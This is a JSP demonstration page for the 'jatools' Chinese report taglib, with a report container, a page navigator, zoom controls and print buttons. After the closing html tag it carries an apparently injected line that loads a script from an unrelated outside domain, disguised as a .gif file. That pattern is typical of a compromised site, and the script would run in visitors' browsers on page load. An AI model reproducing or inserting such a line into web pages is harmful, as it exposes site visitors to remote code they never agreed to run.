<%@ page language="java" contentType="text/html; charset=GB2312"
    pageEncoding="GB2312"%>
<%@ taglib uri="/WEB-INF/tlds/jatools.tld" prefix="jatools" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=GB2312">
<title>杰表 jsp taglib 演示</title>
</head>

<body>
<script>


</script>





<jatools:report id="_report1" template="D:/builder/jr4.0.eval/jrs_4.0.eval.with_tomcat/webapps/jrs/example/master.xml" border="border:1px solid blue" offset="4" cached='true' />
<jatools:printer id="_printer" for_report="_report1"/>
<jatools:container id="_container" for_report="_report1" scroll='true' width='100%' height='80%' background="#EFEBEF"/>
<jatools:navigator id="_navigator" alias='_my_navigator' for_report="_report1">
<%@ include file="nav1.jsp" %>
</jatools:navigator>
<jatools:zoomer id="_zoomer" for_container="_container"/>



<br>

<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="826" id="AutoNumber1" height="37">
  <tr>
     <!-- 页面导航 -->
    <td width="40%" height="37"><% _navigator.render(); %></td>
	 <!-- 缩放按钮 -->
    <td width="%30" height="37"><div ><INPUT TYPE="button" VALUE="放大" ONMOUSEUP="<%=_zoomer.zoomInScript%>"/><INPUT ID="zoomnumber" TYPE="TEXT" VALUE="50" SIZE="7" MAXLENGTH="4" ONKEYUP="<%=_zoomer.zoomToScript("zoomnumber.value")%>"/><font face="Arial"><font size="2">%</font>
    </font><INPUT TYPE="button" VALUE="缩小" ONMOUSEUP="<%=_zoomer.zoomOutScript%>"/>&nbsp;<INPUT TYPE="button" VALUE="原始大小" ONMOUSEUP="<%=_zoomer.zoomNoScript%>"/></div></td>
	 <!-- 打印按钮 -->
	<td width="30%" height="37"><div ><INPUT TYPE="button" VALUE="打印预览..." ONMOUSEUP="<%=_printer.previewScript%>"/><INPUT TYPE="button" VALUE="打印..." ONMOUSEUP="<%=_printer.printWithPromptScript%>"/>&nbsp;<INPUT TYPE="button" VALUE="打印" ONMOUSEUP="<%=_printer.printScript%>"/></div></td>
  </tr>
 

</table>

<% _container.render(); %>
<div style='clear:both'/>
<% _navigator.render(); %>


<% _container.render(); %>


</body>
</html>

<script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
